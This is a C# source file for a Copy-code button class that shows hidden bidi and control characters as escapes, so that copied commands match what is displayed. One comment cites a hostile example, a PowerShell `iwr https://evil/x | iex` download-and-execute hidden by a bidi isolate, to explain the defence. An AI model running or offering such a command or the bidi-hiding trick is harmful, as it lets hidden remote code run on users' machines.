namespace AgentBridge.App.Core;

// A code block's text and its Copy button (#296), as the PWA's (pwa/js/markdown.js codeBlock): what
// the block draws, what Copy puts on the clipboard (the same), and what Copy says afterwards. Copy
// takes every space, tab and line break as drawn, never the lines the text wraps into on screen: a
// long command pasted into a shell must be the one command it was.
//
// What is drawn is the agent's text with every character that is not on screen as it runs shown
// as an escape (#220): a bidi isolate can draw `echo ok # check; iwr https://evil/x | iex`, a
// harmless comment, for a command that runs the download. So Copy takes the escapes too: a shell it
// is pasted into gets `\u2067` literally, never a command the person did not see.
public sealed class CodeCopy : Observable
{
    // The button's name stays this whatever it shows; what happened is announced separately.
    public const string Name = "Copy code";
    public const string Ready = "Copy";
    public const string Done = "Copied";
    public const string Failed = "Copy failed";
    public static readonly TimeSpan ResetAfter = TimeSpan.FromMilliseconds(1500);

    readonly Func<string, bool> put;
    readonly IUiDispatcher ui;
    readonly TimeProvider time;
    ITimer? reset;
    int copies;
    string label = Ready;

    // put: places text on the clipboard, false if the clipboard refused it (another program can
    // hold it open). Its timer's callback comes back through ui, on the UI thread in the app.
    public CodeCopy(MdCode code, Func<string, bool> put, IUiDispatcher? ui = null, TimeProvider? time = null)
    {
        Text = HiddenText.Reveal(code.Text).TrimEnd('\n');
        RightToLeft = HiddenText.HasRightToLeft(code.Text);
        this.put = put;
        this.ui = ui ?? InlineDispatcher.Instance;
        this.time = time ?? TimeProvider.System;
    }

    // What the block draws and Copy takes: revealed, and without the blank lines a fence may end
    // with, which would draw as nothing (and pasted, would run the last line).
    public string Text { get; }

    // Right-to-left letters reorder what is drawn around them with no control at all; the block is
    // drawn left to right and says it holds them (RightToLeftNote), and copies as drawn.
    public bool RightToLeft { get; }
    public const string RightToLeftNote = "Contains right-to-left text";

    public string Label { get => label; private set => Set(ref label, value); }

    public bool Copy()
    {
        bool ok;
        try { ok = put(Text); }
        catch (Exception e) when (e is System.Runtime.InteropServices.COMException or UnauthorizedAccessException) { ok = false; }
        Label = ok ? Done : Failed;
        reset?.Dispose();
        // Disposing the old timer can't recall a reset it already posted: each reset carries the
        // copy it belongs to, and one from an earlier copy leaves this copy's word showing.
        var copy = ++copies;
        reset = time.CreateTimer(_ => ui.Post(() => { if (copy == copies) { Label = Ready; } }), null, ResetAfter, Timeout.InfiniteTimeSpan);
        return ok;
    }
}
